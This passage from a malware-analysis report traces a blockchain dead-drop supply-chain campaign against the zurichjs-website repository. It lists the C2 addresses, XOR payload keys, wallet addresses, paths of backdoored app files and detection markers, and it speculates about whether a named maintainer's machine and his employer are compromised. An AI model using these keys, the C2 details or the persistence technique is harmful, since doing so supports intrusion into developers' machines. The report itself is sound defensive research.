2026-05-21 13:09      0x1588991e1a5049b3a77305a9a09779d7a588686373a1436ebd56f30fe4d7be44
2026-05-21 13:14      0xe7058ec299469f48bb38aac5b97f288139b89ff0e47b48fd98da4fa817df9c71
2026-05-21 13:20      0x615e2bd0fa06dfd8947aac85e09b672628c15d8cb276e808b72b297b626544e3
2026-05-22 13:17      0xf188850b746bc8c467e95e7c3d2a6a47eb92211ab3cc69355e88d4f7375e31c5
2026-05-23 16:28      0xfad600a962daefebe456f96989bfe5ec65ab4438e48fb788e1b9b59000d2cec9
2026-06-02 16:01      0xa1eeb9dc3b5c4ae0f8c292c14ed9cfb50bdb4586ad01ada719bff648b89dfd51   |
2026-06-02 16:05      0x55574a62c1f2afbe528834f96ed44bca7d0a2ba151d8e4b177a31646cc415c7d   | BURST: 6 rotations
2026-06-02 16:09      0x3bb80ebaa4ac38dd1c90a1689d3f2148d801225894a95e1b7757ea94429be198   | in 53 minutes --
2026-06-02 16:51      0x8ba882519e64756d4c5ecb19bffc0cf65704956f73a0c984c16f6fdc9569c26a   | live payload
2026-06-02 16:54      0xa7de3a7764f31866c15a2b4075b381f9cedeb5bd9f27d7621eee3e1b7b59f36f   | iteration
2026-06-03 12:41      0x54b8bde10ea26d9ae0702e6e590f0af3e500cb14fda876e908620760ac32b76c
2026-06-05 14:31      0x23fea476d18039a65bd438a4a071c2feb1530592b96ddf15c6ffb93acc03cd3f
2026-06-08 21:29      0xb6c725890be6890fd2c735eedc47e24b85a350301f6c19a3864e43c35e470968   <- LATEST (8 days ago)
```

**Note:** Wallet 1 (`TCqf6Zka...`) also received an unrelated inbound TRC10 token transfer
("Gas97", a TRON gambling/energy-rental advertising spam token, 0.97 units) on 2026-06-15. This is
generic blockchain dust/spam unrelated to actor activity -- TRON addresses with transaction history
are routinely targeted by such airdrops. It does not indicate W1 is back in active use; W1's last
genuine outbound dead-drop write remains 2026-05-19.

### RAT Development Timeline (Stage 3 payload size evolution)

Payload sizes measured from BSC `input` field (XOR-encrypted + LZString compressed Stage 3):

```
DATE            SIZE (B)   DELTA      EVENT
----------      --------   -------    -----
2025-11-14       71,882             <- First build (v1), day after wallet creation
2025-11-18       71,882       0     <- Stability test (identical payload)
2025-11-19       72,611    +729     <- Minor addition
2025-12-16       73,207    +596     <- Minor addition
2025-12-17       76,630   +3,423    <- Significant feature add *
2025-12-17       75,721    -909     <- Rollback
2025-12-19       75,721       0     <- Re-test
2025-12-22       76,761   +1,040    <- Restored + increment
2026-01-06       80,603   +3,842    <- Major feature add *
2026-01-23       86,428   +5,825    <- Large feature add * (probable persistence injection added)
2026-01-23       86,428       0     <- Testing (3 rotations same day)
2026-01-24       86,428       0     <- Testing
2026-01-30       93,708   +7,280    <- Largest single jump * (full operator command suite?)
2026-01-30       93,708       0     <- Testing (3 rotations same day)
2026-02-10       93,072    -636     <- Minor optimization
2026-02-11       69,880  -23,192    <- MAJOR REWRITE (payload shrinks 23KB) *
2026-02-11       69,880       0     <- Testing
2026-02-11       69,460    -420     <- Final optimization
2026-02-12       69,460       0     <- Final pre-campaign version
...
[2026-02-19: campaign 5-3-161 launches]
...
Campaign versions (2026-02-25 through 2026-06-08): ~70K-77K bytes
```

Key observations:
- **3 months of development** before the first campaign injection (2026-02-19)
- The 2026-01-23 jump to 86K bytes likely marks when app persistence injection was added
  (VS Code / Discord / GitHub Desktop — each requiring their own path resolution and injection logic)
- The 2026-01-30 jump to 93K marks the largest single capability addition — likely the full
  operator command suite (`ss_inz`, `ss_upf`, `ss_dir`, `ss_eval64`, etc.)
- The 2026-02-11 **major rewrite** drops 23KB — the actor likely replaced the LZString + eval
  approach with a more efficient encoding, or removed debug/dead code before campaign launch
- Total payload growth: **+21,826B** (+31%) from first build to peak (93K), then
  **-23,248B** (-25%) via rewrite back to campaign-ready 69K

### Aptos Full Timeline (parallel dead-drop, 63 entries)

Aptos-1 (24 txs), Aptos-2 (3 txs), and Aptos-3 (63 txs) match TRON timelines exactly.
The single Aptos-only discrepancy: on 2026-02-25, Aptos-3 received 6 rapid test entries
(18:01–18:59) that were NOT written to TRON W3. TRON W3 only received the final version
for that day starting at 20:00. This confirms:

1. Aptos is the actor's **staging/testing chain** — experimental payloads go here first
2. TRON is the **production chain** — only finalized payload pointers propagate here
3. The malware fallback logic (Aptos if TRON fails) means victims would also receive
   test payloads in a TRON-outage scenario (likely acceptable to the actor during dev)

### Key Operational Observations

1. **Infrastructure age: 7+ months, RAT in development 3 months before first campaign.**
   The actor stood up the blockchain dead-drop network on 2025-11-13 and wrote the first
   Stage 3 payload the next day (2025-11-14). From November 2025 through February 2026 (campaign
   launch), 23 distinct payload versions were tested — revealing a disciplined 3-month build-and-test
   cycle before exposing the RAT to real victims. Total development span: at least 8 months.

2. **13 payload rotations in 174 minutes (2026-02-25)** while campaign 5-3-161 was active suggests
   live debugging against real victim machines -- the actor was iterating rapidly on the payload
   while the campaign was running.

3. **6-day pre-staging for campaign 5-3-298**: the Stage 1 payload pointing to campaign 5-3-298
   was written to the blockchain on **2026-05-19**, six days before the injection commit on
   2026-05-25. The attack was pre-planned, not improvised.

4. **Wallet 2 (fallback) saw only 3 outbound writes total** and has been dormant since 2026-02-27 --
   the opposite of what was assumed before re-verification; it appears to be a rarely-used backup
   path, not a high-volume channel.

5. **Wallet 3 (Stage 1b / RAT framework) is updated far more frequently than Stage 1/Wallet 1**,
   with repeated same-day bursts (2026-02-25, 2026-06-02) -- the operator iterates on the RAT
   payload itself much more than on the initial loader.

6. **Campaign infrastructure is still active as of 2026-06-08** (8 days before this update), with
   a 6-rotation burst in 53 minutes on 2026-06-02 matching the same live-iteration pattern seen on
   2026-02-25 during the 5-3-161 campaign. Wallets 1 and 2 (Stage 0/1 loader) have gone quiet since
   2026-05-19/02-27 respectively, but Wallet 3 (Stage 3 RAT payload) continues to rotate -- the
   actor may be re-using this dead-drop infrastructure for a different/follow-on campaign, or is
   maintaining the RAT for already-compromised hosts independent of new injections.

### XOR Keys

```
2[gWfGj;<:-93Z^C   <- key 1 (all payload stages)
m6:tTh^D)cBz?NM]  <- key 2 (Stage 0 fallback)
```

### Git Indicators

```
Infection commit:   bd6cf2bae2c628b9d6f7f3477669ada1d0c5e2e3  (2026-05-25T18:32:10Z)
Commit message:     "fix twint"
Author:             farisaziz12 (GitHub ID 53216647)
Remediation commit: 19ef30866396a414d985af5cd02cf821368b680a  (2026-05-26T15:46:46Z)
```

### Runtime Indicators

```javascript
// Node.js process globals (Stage 0/1)
global.i       = '5-3-298'
global['_V']   = '5-3-298'
global['_t_t'] = <timestamp>          // dedup guard
global['_t_s'] = 'http://198.105.127.210:443'
global['_t_u'] = 'http://198.105.127.210:80'

// Injected file markers (detect in app source files)
/*RS260605*/    // root script build marker
/*C250617A*/    // child injection stubs (also C250618A, C250619A, C250620A, C260511A, C260512A)
```

### Injected App File Paths (check for tampering)

Look for `/*RS260605*/` or any `/*C25....*/` / `/*C26....*/` marker injected into these files.

```
# Windows
%LOCALAPPDATA%\Programs\Microsoft VS Code\resources\app\node_modules\@vscode\deviceid\dist\index.js
%LOCALAPPDATA%\Programs\cursor\resources\app\node_modules\@vscode\deviceid\dist\index.js
%LOCALAPPDATA%\Programs\Antigravity\resources\app\node_modules\@vscode\deviceid\dist\index.js
%LOCALAPPDATA%\GitHubDesktop\resources\app\main.js
# Discord (two module slot variants):
%APPDATA%\discord\<ver>\modules\discord_desktop_core-1\discord_desktop_core\index.js
%APPDATA%\discord\<ver>\modules\discord_desktop_core\index.js

# macOS
/Applications/Visual Studio Code.app/Contents/Resources/app/node_modules/@vscode/deviceid/dist/index.js
/Applications/Cursor.app/Contents/Resources/app/node_modules/@vscode/deviceid/dist/index.js
/Applications/Antigravity.app/Contents/Resources/app/node_modules/@vscode/deviceid/dist/index.js
/Applications/GitHub Desktop.app/Contents/Resources/app/main.js
# Discord (two module slot variants):
~/Library/Application Support/discord/<ver>/modules/discord_desktop_core-1/discord_desktop_core/index.js
~/Library/Application Support/discord/<ver>/modules/discord_desktop_core/index.js

# Linux
/usr/share/code/resources/app/node_modules/@vscode/deviceid/dist/index.js
/usr/share/cursor/resources/app/node_modules/@vscode/deviceid/dist/index.js
/usr/share/antigravity/resources/app/node_modules/@vscode/deviceid/dist/index.js
/usr/share/discord/<ver>/modules/discord_desktop_core-1/discord_desktop_core/index.js
/usr/share/discord/<ver>/modules/discord_desktop_core/index.js
/usr/share/GitHub Desktop/Contents/Resources/app/main.js

# All platforms
<npm global root>/npm/lib/cli.js      # verify with: npm root -g
```

### Staging / Temp Directories

Stage 3 drops temp files here during install and execution:

```
# Windows
%APPDATA%\Temp\

# Linux / macOS
/tmp/
```

### Fallback Python / Node Executable Paths

Stage 4 uses these hardcoded paths to spawn the runtime if `node` is not on `PATH`:

```
# Windows
%LOCALAPPDATA%\Programs\Python\Python3127\   (Python 3.12.7)

# Linux / macOS
~/.local/bin/node20                          (Node 20 binary)
```

---

## MITRE ATT&CK Mapping

| ID | Technique | Implementation |
|----|-----------|----------------|
| **T1195.002** | Supply Chain Compromise: Software Supply Chain | Payload injected into `postcss.config.mjs` in open-source repo via compromised maintainer account |
| **T1078.003** | Valid Accounts: Local Accounts | `farisaziz12` GitHub account used for both legitimate commits (313) and malicious injection commits |
| **T1059.007** | Command and Scripting Interpreter: JavaScript | All stages (0–4) are JavaScript; detached `node -e` subprocess spawned from PostCSS hook |
| **T1036.001** | Masquerading: Invalid Code Signature | Injection hidden behind 2,700+ trailing ASCII spaces — invisible in standard diff views |
| **T1027.001** | Obfuscated Files or Information: Binary Padding | Trailing whitespace padding to push payload off screen in diff views |
| **T1027.010** | Obfuscated Files or Information: Command Obfuscation | Custom shuffle cipher (seeds: 36301, 1347634, 2862089, 2191935) + function-constructor decoder |
| **T1027.002** | Obfuscated Files or Information: Software Packing | LZString UTF-16 compression for Stage 3 payload in BSC calldata |
| **T1140** | Deobfuscate/Decode Files or Information | XOR decryption + LZString decompression in each stage |
| **T1102.001** | Web Service: Dead Drop Resolver | TRON and Aptos blockchain transactions encode BSC transaction hashes pointing to encrypted Stage payloads |
| **T1608.001** | Stage Capabilities: Upload Malware | Stage 1, 2, 3 payloads stored in BSC transaction calldata; Stage 4 served live from C2 |
| **T1583.003** | Acquire Infrastructure: Virtual Private Server | Three VPS nodes under AS149440 (Evoxt Sdn. Bhd.) |
| **T1554** | Compromise Client Software Binary | Stage 3 injects Stage 4 backdoor into VS Code, Cursor, Antigravity, Discord, GitHub Desktop, NPM CLI |
| **T1547** | Boot or Logon Autostart Execution | Injected app files execute Stage 4 every time the application launches |
| **T1219** | Remote Access Software | Stage 4 socket.io WebSocket RAT with full operator console |
| **T1071.001** | Application Layer Protocol: Web Protocols | socket.io WebSocket C2 over HTTP port 443 |
| **T1071.004** | Application Layer Protocol: DNS | (Indirect) blockchain DNS-like resolution via TRON/Aptos/BSC APIs |
| **T1573** | Encrypted Channel | XOR encryption for all payload stages |
| **T1480** | Execution Guardrails | CI/sandbox hostname blocklist (`github-runner`, `buildbot`, etc.); actor test machine self-exclusion (`EV-CHQG3L42MMQ`, `EV-4A6OE6M0E2D`) |
| **T1497.001** | Virtualization/Sandbox Evasion: System Checks | Checks `os.hostname()` against blocklist; checks username `root`; aborts in CI environments |
| **T1518.001** | Software Discovery: Security Software Discovery | Windows `tasklist /FO CSV /NH` — MD5-checks processes starting with `O` against target hash |
| **T1057** | Process Discovery | `tasklist /FO CSV /NH` enumerates running processes (Windows) |
| **T1082** | System Information Discovery | `os.hostname()`, `process.platform`, `process.env` queried at startup |
| **T1016** | System Network Configuration Discovery | IP geolocation via `http://ip-api.com/json` in Stage 4 (`ss_ip` command) |
| **T1115** | Clipboard Data | `powershell Get-Clipboard` (Win), `pbpaste` (macOS), `xclip` (Linux) via `ss_cb` command |
| **T1005** | Data from Local System | `ss_upf` / `ss_upd` upload files/directories to C2; shell access enables arbitrary exfil |
| **T1041** | Exfiltration Over C2 Channel | File upload via POST `/u/f`; Telegram fallback exfil |
| **T1105** | Ingress Tool Transfer | `npm install socket.io-client axios` installed on victim by Stage 3 |
| **T1036.005** | Masquerading: Match Legitimate Name or Location | C2 on port 443 mimics HTTPS; commit message "fix twint" disguises injection commit |

**Distinctive cluster for detection:** T1195.002 → T1059.007 → T1102.001 → T1554 → T1219 is the
kill chain unique to this campaign. The blockchain dead-drop (T1102.001) is the highest-fidelity
detection point — monitoring for 0-APT Aptos transfers or 0-TRX TRON transfers to known actor
addresses provides early warning of new campaign staging.

---

## Actor Assessment

**Attribution: Lazarus Group (DPRK) / DEV#POPPER / PolinRider -- HIGH confidence**

The reinfection and full payload analysis confirms:
1. The actor retains persistent access to `farisaziz12` -- not a one-time compromise
2. The actor monitors for remediation and re-attacks within weeks
3. Complete infrastructure overlap with documented DEV#POPPER campaigns (same C2 IP, wallets, keys)
4. Significant TTP evolution: rebuilt C2 in Node.js/socket.io, added full RAT capabilities
5. Build date markers suggest the new RAT framework was in development since at least June 2025
6. The C2 was actively maintained on the day of analysis (Stage 1b wallet updated, Stage 4 rebuilt)

### TTP Changes (5-3-161 to 5-3-298)

| TTP | Old | New | Interpretation |
|-----|-----|-----|----------------|
| Target file | next.config.mjs | postcss.config.mjs | Evade file-specific monitoring |
| C2 port | 27017 (MongoDB-mimic) | 443 (HTTPS-mimic) | Evade port-based blocking |
| C2 framework | EmbedIO/C# | Express.js/Node.js | Full C2 rebuild |
| C2 protocol | HTTP REST (polling) | Socket.io WebSocket | Real-time operator control |
| Stage 4 path | /$/boot | /0x/js?_V=...&id=... | New path structure |
| Stage 0 execution | Direct eval() | Detached node spawn | Survive PostCSS lifecycle |
| Old port 27017 | Active C2 | Decoy -> GitHub | Misdirect forensic analysis |
| Malware class | Credential stealer | Full RAT + persistence | Major escalation |
| App injection | None | VS Code, Cursor, Discord, GitHub Desktop, NPM | Long-term persistence |

---

## Victim Exposure

**Exposure window:** Developers who cloned `zurich-js/zurichjs-website` and ran `npm run dev` or
`npm run build` between **2026-05-25 18:32 UTC and 2026-05-26 15:46 UTC** (~21 hours).

**What Stage 3/4 does to a victim machine:**

1. Installs socket.io-client via npm (leaves traces in `node_modules`)
2. Injects backdoor code into VS Code, Cursor, Antigravity, Discord, GitHub Desktop, and NPM
   if installed -- these backdoors **persist after the zurichjs-website repo is removed**
3. Opens a socket.io WebSocket connection to `198.105.127.210:443`
4. Gives the operator full interactive shell, file access, clipboard, and eval capability

**Persistent infection check:** Victims may remain backdoored even after rotating credentials,
if the Stage 3/4 injection into VS Code / Cursor / Discord / NPM succeeded. Those app files
must be inspected and restored.

**Credential exposure scope:** The Stage 5 payload (served via `/u/f` or through operator
commands post-compromise) was not retrieved in this analysis. Based on Stage 4 capabilities
(full shell + file ops + clipboard), assume all credentials accessible from the victim machine
are at risk, not just browser-stored passwords.

---

## Recommended Actions

1. **Block updated network IOCs:**
   - `198.105.127.210:443` (in addition to existing block of `:27017`)
   - `/0x/js` and `/socket.io/` paths if using path-aware proxies

2. **Check injected app files** on any machine that may have run the infected repo:
   - VS Code, Cursor, Antigravity, Discord, GitHub Desktop: see full path table above
   - NPM: check `$(npm root -g)/npm/lib/cli.js` for `/*RS260605*/` or `/*C25...*/` markers
   - Also check temp dirs (`%APPDATA%\Temp\`, `/tmp/`) for stray JS payloads
   - Check `~/.local/bin/node20` (Linux/macOS) -- may be a planted Node binary
   - If injected files found: reinstall the application from a clean source

3. **Rotate all credentials** (same as campaign 5-3-161 guidance):
   - GitHub PATs, npm tokens, SSH keys, browser passwords, cloud API keys

4. **Revoke active sessions** for all services accessible from affected machines.

5. **GitHub account `farisaziz12`:** Notify GitHub security and zurich-js maintainers. The actor
   retains access -- a third injection is likely.

6. **Monitor TRON wallets** for new transactions (operator updates payload before each injection):
   - `TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF`
   - `TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v` (Stage 1b -- updated 2026-06-05)

7. **Alert on injection markers** in CI pipelines:
   - Scan `postcss.config.mjs`, `next.config.mjs`, and all build config files for trailing
     whitespace > 100 chars followed by `global.i=`
   - Alert on `global['_V']` or `global.i` set to hyphen-delimited version strings in Node.js

8. **Report Telegram bot** `@file_1018_bot` to https://t.me/abuse (same as campaign 5-3-161).

9. **Monitor `zurich-js/zurichjs-conf`** for malicious build config injection using the same
   pattern (trailing whitespace > 100 chars + `global.i=` on build config files). Key files to
   watch: `postcss.config.mjs`, `next.config.ts`. The account `farisaziz12` pushed to this repo
   today (2026-06-18) and it is a live, active project. A third injection is the actor's established
   pattern.

10. **Notify Smallpdf** security team. If Faris Aziz's development machine is still infected, the
    actor has potential access to Smallpdf internal systems. Smallpdf should audit for anomalous
    access to their development infrastructure, particularly any secrets or tokens accessible from
    developer workstations.

---

## Liveness Verification — 2026-06-18

Full recheck performed 2026-06-18 ~10:06–10:30 UTC, 13 days after initial analysis (2026-06-05).

### C2 Status (2026-06-18)

| Port | Status | Change from 06-05 | Detail |
|------|--------|-------------------|--------|
| 443 | **ALIVE** | No change | Express.js, socket.io. New SID `517ruIfWJScPRzO8Ac6E` — server actively processing connections |
| 80 | DOWN | No change | Timeout |
| 27017 | ALIVE (nginx) | **CHANGED** | Was: `HTTP 302 → GitHub decoy`. Now: `HTTP 404`. Decoy redirect rule removed (see below). |

**Port 27017 decoy removed.** On 2026-06-05 the nginx server on port 27017 redirected all GET requests
to `https://github.com/duanegoodner/xiangqigame/.../gist_crtp_constructors` — a deliberate analyst
misdirection pointing to a legitimate ELF binary. As of 2026-06-18 that redirect rule is gone;
the nginx server is still running (`nginx/1.28.0`, same headers) but all paths return 404. The timing
is consistent with the actor becoming aware of public analysis, or routine infrastructure cleanup.

### Stage 4 Payload (2026-06-18)

The Stage 4 RAT was silently updated. Build marker unchanged (`/*RS260605*/`) but content differs:

| | 2026-06-05 (original) | 2026-06-18 (updated) |
|--|--|--|
| Size | 69,913 bytes | 68,572 bytes (-1,341 bytes) |
| MD5 | `fc12cc4b186019e420a273053717927d` | `c45e510e59bc503d06e66a7cf046af5a` |
| Build marker | `/*RS260605*/` | `/*RS260605*/` (unchanged) |
| Generator functions | 24 | 24 (unchanged) |
| String literals (3+ chars) | 295 | 308 (+13) |

All four active campaign versions (`_V=A`, `_V=C`, `_V=5-3-161`, `_V=5-3-298`) return the identical
updated payload — the same 68,572-byte build served to all victims regardless of which campaign
infected them. Structure is unchanged (24 generator functions); ~1,341 bytes of logic were removed
and 13 new string entries were added. Full semantic diff requires deobfuscation; saved as
`c2_data/stage4_live_20260618.js`.

The actor updated the payload without bumping the build date, which is atypical — prior updates
(Stage 1b wallet on 06-05 and 06-08) did correlate with fresh payload delivery. The silent update
suggests a hotfix rather than a deliberate versioned release.

### Wallet Status (2026-06-18)

No new transactions on any wallet since the previous check (2026-06-08 21:29 UTC on W3):

- **W1 (TCqf6Z...)**: last outbound 2026-05-19. Confirmed dormant. (W1 received unrelated Gas97 TRC10 spam airdrop on 2026-06-15 — not actor activity.)
- **W2 (TFMry...)**: last outbound 2026-02-27. Confirmed dormant.
- **W3 (TA48dct...)**: last outbound 2026-06-08 21:29 UTC. No new updates in 10 days.

The 10-day gap in W3 updates is the longest quiet period since the 06-02 burst activity began.
Combined with the Stage 4 hotfix, the actor may be consolidating rather than actively rotating.

---

## Victim Analysis

### Exposure Surface

**Campaign 5-3-298** (postcss.config.mjs): 21-hour window (2026-05-25 18:32 – 2026-05-26 15:46 UTC).
Any developer who ran `npm run dev`, `npm run build`, or any PostCSS-triggering command on a clone
of `zurichjs-website` during that window would be infected.

**Campaign 5-3-161** (next.config.mjs): 74-day window (2026-02-19 – 2026-05-04). Far larger
exposure surface — any developer working with the repo over those 74 days is at risk. Both
campaigns share the same Stage 1b dead-drop (W3 / `TA48dct...`) and C2.

### Known Contributors (primary at-risk pool)

| GitHub account | Role | Contributions |
|---------------|------|---------------|
| `farisaziz12` (Faris Aziz) | **Founder of ZurichJS**, Staff Frontend Engineer @Smallpdf, Geneva | 313 — primary maintainer |
| `nosthrillz` | Contributor | 57 |
| `claude` | Claude Code (AI assistant) | 15 |
| `xplosunn` | Contributor | 4–8 |
| `cybersharkw` | Contributor | 6 |
| `colinscz` | Contributor | 4 |

`farisaziz12` is not a sock puppet — it is the verified real account of Faris Aziz (GitHub ID 53216647,
account created 2019-07-23, 79 followers, 58 public repos, public bio confirms identity). The actor
either obtained his session token/credentials via an earlier compromise, or via phishing.

**Faris Aziz's account was active on 2026-06-18** (the day of this update), pushing to the
`zurich-js/zurichjs-conf` repo — a new ZurichJS conference website. If his development machine is
still backdoored, the actor retains implicit access to that repo and to his employer Smallpdf's
internal systems.

### Evidence of Active Victims (post-remediation)

The strongest signal that at least one victim machine is still infected and calling home:

1. **6-rotation burst in 53 minutes on 2026-06-02** — 7 days after repo remediation. W3 was updated 6
   times in rapid succession, then again on 06-03, 06-05, and 06-08. This matches the 02-25 burst
   during active 5-3-161 operation: the actor pushed a payload, something broke on the victim end,
   iterated a fix in minutes, pushed again. This is live debugging against a running infected machine.

2. **Stage 4 silently hotfixed 2026-06-18** — the actor is actively maintaining the RAT for current
   sessions. If there were no live connections there would be no operational reason to update Stage 4.

3. **Persistence injection bypasses repo removal** — Stage 3 injects into VS Code, Cursor, Discord,
   GitHub Desktop, and NPM. A developer who ran the infected repo and had any of those apps installed
   remains infected even after the repo was cleaned. The backdoored app loads Stage 4 every time the
   application launches.

### Smallpdf Lateral Movement Risk

`farisaziz12` is employed as a Staff Frontend Engineer at Smallpdf (Swiss SaaS company, ~400K+ users,
PDF/document processing). If his dev machine is infected, the Stage 4 RAT gives the operator:
- Access to Smallpdf internal tooling, dashboards, and CI/CD secrets accessible from his machine
- Clipboard contents (2FA codes, passwords copied during work)
- Full filesystem read — SSH keys, API tokens, `.env` files, cloud credentials
- Shell access in the context of any development environment he is running

This is speculative — we cannot confirm whether his machine is infected vs. only his GitHub
credentials being stolen — but it represents a significant second-order risk.

### Other Campaigns on Same C2

The C2 at `198.105.127.210:443` serves payloads for at least four campaign versions:
`_V=A`, `_V=C`, `_V=5-3-161`, `_V=5-3-298`. All return identical 68,572-byte Stage 4 builds.
Campaign versions `A` and `C` correspond to earlier DEV#POPPER supply-chain attacks targeting
different repositories (per eSentire TRU analysis, Feb 2026). Those campaigns have entirely
separate victim pools — developers from whatever npm packages or GitHub repos were targeted in
those waves. The infrastructure consolidation of all versions under a single C2 IP suggests
centralized operator management.

### New ZurichJS Repository — `zurich-js/zurichjs-conf`

A new repository (`zurich-js/zurichjs-conf`) was created 2025-11-03 and is actively developed by
`farisaziz12` and other ZurichJS contributors. As of 2026-06-18 all build config files are clean:
- `postcss.config.mjs`: 56 bytes, 3 lines, no injection
- `next.config.ts`: 108 lines / 3,668 bytes, no suspicious patterns

**CI/CD analysis:** The `.github/workflows/ci.yml` runs on every push to `main` and every PR.
It executes `pnpm install`, `pnpm test:run`, `pnpm lint`, and `pnpm typecheck` — but notably
**never `pnpm build` or `next build`**. PostCSS (and thus `postcss.config.mjs`) is only invoked
during a Next.js build, not during tests/lint/typecheck. Therefore **GitHub Actions CI runners
are safe** from a `postcss.config.mjs` injection — the payload would not execute in CI.

However, any developer running `pnpm dev` (which calls `next dev`) locally would trigger PostCSS
and execute an injected payload. The at-risk surface is developer workstations, not CI
infrastructure.

Given the actor's established pattern (2 injections in 21 days after the first remediation),
this repo should be treated as an ongoing target. See recommended actions.

---

## Analysis Artifacts

```
/root/zurichjs2_analysis/
  postcss.config.mjs.infected        <- Stage 0 (from GitHub)
  c2_data/
    stage1_decrypted.js              <- Stage 1 (XOR-decrypted from BSC)
    stage2_decoded.js                <- Stage 2 (RrR-decoded from Stage 1)
    stage3_decrypted.js              <- Stage 3 (XOR-decrypted from BSC Stage 1b)
    stage3_inner.js                  <- Stage 3 inner (Function wrapper stripped)
    stage3_stringtable.js            <- Stage 3 decompressed string table
    stage3_elf.bin                   <- Decoy ELF from port 27017 redirect (NOT malware)
    stage4_live.js                   <- Stage 4 v1 (live from C2, 2026-06-05; 69,913 bytes)
    stage4_live_20260618.js          <- Stage 4 v2 (live from C2, 2026-06-18; 68,572 bytes; silently updated)
```

---

## IOC Quick-Reference Table

Consolidated for ingestion into SIEM, EDR, or threat intel platforms. All network IOCs confirmed live as of 2026-06-18 unless marked DEAD.

### Network

| Type | Value | Notes |
|------|-------|-------|
| IPv4 | `198.105.127.210` | Primary C2 — AS149440 Evoxt, London GB — **ALIVE** |
| IPv4 | `23.27.202.27` | Secondary C2 (socket.io only) — AS149440 Evoxt, New York US — **ALIVE** |
| IPv4 | `136.0.9.8` | Former C2 (_V=A campaigns) — **DEAD** as of 2026-06-18 |
| IP:Port | `198.105.127.210:443` | Stage 4 delivery + RAT WebSocket |
| IP:Port | `198.105.127.210:80` | C2 fallback — not responding |
| IP:Port | `23.27.202.27:443` | RAT WebSocket listener |
| URL path | `/0x/js?_V=<ver>&id=<uuid>` | Stage 4 delivery endpoint |
| URL path | `/u/f` | File upload (POST) |
| URL path | `/verify-human/<channel>` | Operator alert (POST) |
| URL path | `/socket.io/?EIO=4&transport=...` | RAT WebSocket handshake |
| External | `ip-api.com/json` | IP geolocation called by Stage 4 |
| Blockchain RPC | `bsc-dataseed.binance.org` | BSC payload resolution |
| Blockchain RPC | `bsc-rpc.publicnode.com` | BSC fallback |
| Blockchain RPC | `api.trongrid.io` | TRON wallet dead-drop lookup |
| Blockchain RPC | `fullnode.mainnet.aptoslabs.com` | Aptos dead-drop lookup |

### File Hashes

| Hash type | Value | File / Description |
|-----------|-------|--------------------|
| SHA-256 | `c1314e72963f6be2aaa0f5d51a34608203b69401eb7e4b2828f5fc7413febc37` | `postcss.config.mjs` — Stage 0 infection (injected file) |
| SHA-256 | `d017fe6e8e138630575050902acde5a41a4d676f73eace64ecc47d49262e2330` | Stage 1 (XOR-decrypted from BSC) |
| SHA-256 | `c74e11f97168d9f1f3a434248c9d875b0012cca23e90a5940b7bd4a61063172d` | Stage 4 v1 — 69,913 bytes, retrieved 2026-06-05 |
| MD5 | `c45e510e59bc503d06e66a7cf046af5a` | Stage 4 v2 — 68,572 bytes, silently updated 2026-06-18 |
| Build marker | `/*RS260605*/` | Embedded in Stage 4 (both v1 and v2) |

### Blockchain Addresses

| Chain | Address | Role | Status |
|-------|---------|------|--------|
| TRON | `TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF` | Stage 1 dead-drop — primary | Dormant since 2026-05-19 |
| TRON | `TFMryB9m6d4kBMRjEVyFRbqKSV1cV2NcpH` | Stage 1 dead-drop — fallback | Dormant since 2026-02-27 |
| TRON | `TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v` | Stage 1b dead-drop (active payload) | **ACTIVE** — last tx 2026-06-08 |
| Aptos | `0x9d202c824402ca89e9aaccd2390b6f8b332ae743caa1469c695feb2781d56519` | Aptos mirror of W1 | 24 txs |
| Aptos | `0x3d2075f97b7b1e3234bd653779d21c605d7d8c6ec9c98d983880be5c7f4f9471` | Aptos mirror of W2 | 3 txs |
| Aptos | `0x533b2dbcaeff19cd1f799234a27b578d713d8fcaa341b7501e4526106483e0b1` | Aptos mirror of W3 (active) | 63 txs — **ACTIVE** |

### Notable BSC Transactions (Stage Payloads)

| BSC tx hash | Written | Content |
|-------------|---------|---------|
| `0x5ab85abe6c67adb94322e5700a36915c38d1db1e604920da8aa4fcb530408af0` | 2026-05-19 | Stage 2→3 (from W1/W2 dead-drop) |
| `0x23fea476d18039a65bd438a4a071c2feb1530592b96ddf15c6ffb93acc03cd3f` | 2026-06-05 | Stage 2→3 (from W3 dead-drop) |
| `0xb6c725890be6890fd2c735eedc47e24b85a350301f6c19a3864e43c35e470968` | 2026-06-08 | Stage 2→3 (from W3 — **most recent**) |

### Filesystem Indicators

| Path | Description |
|------|-------------|
| `<appDir>/resources/app/node_modules/postcss/lib/postcss.config.mjs` | Persistence injection target (VS Code / Cursor) |
| `<appDir>/resources/app/node_modules/postcss/lib/next.config.mjs` | Prior campaign injection target |
| `~/Library/Application Support/discord/…/postcss.config.mjs` | Persistence injection target (Discord, macOS) |
| `<GitHub Desktop appDir>/…/postcss.config.mjs` | Persistence injection target (GitHub Desktop) |
| `<npm global prefix>/lib/node_modules/npm/…/postcss.config.mjs` | Persistence injection target (npm global) |

### Telegram (Operator Exfiltration — from eSentire analysis of related campaigns)

| Type | Value |
|------|-------|
| Chat/group ID | `7699029999` |
| Chat/group ID | `7609033774` |
| Chat/group ID | `-4697384025` |

---

## References

1. Previous campaign analysis: /root/OPENCTI_REPORT.md (campaign 5-3-161)
2. Injection commit: https://github.com/zurich-js/zurichjs-website/commit/bd6cf2bae2c628b9d6f7f3477669ada1d0c5e2e3
3. Remediation commit: https://github.com/zurich-js/zurichjs-website/commit/19ef30866396a414d985af5cd02cf821368b680a
4. Decoy redirect target (NOT malware): https://github.com/duanegoodner/xiangqigame/blob/main/prototypes/crtp_constructors/gist_crtp_constructors
5. eSentire TRU -- DEV#POPPER RAT and OmniStealer (Feb 2026): https://www.esentire.com/blog/north-korean-apt-malware-analysis-dev-popper-rat-and-omnistealer-everyday-im-shufflin
6. Securonix -- Analysis of DEV#POPPER: https://www.securonix.com/blog/analysis-of-devpopper-new-attack-campaign-targeting-software-developers-likely-associated-with-north-korean-threat-actors/
7. OpenSourceMalware / PolinRider dossier: https://github.com/OpenSourceMalware/PolinRider
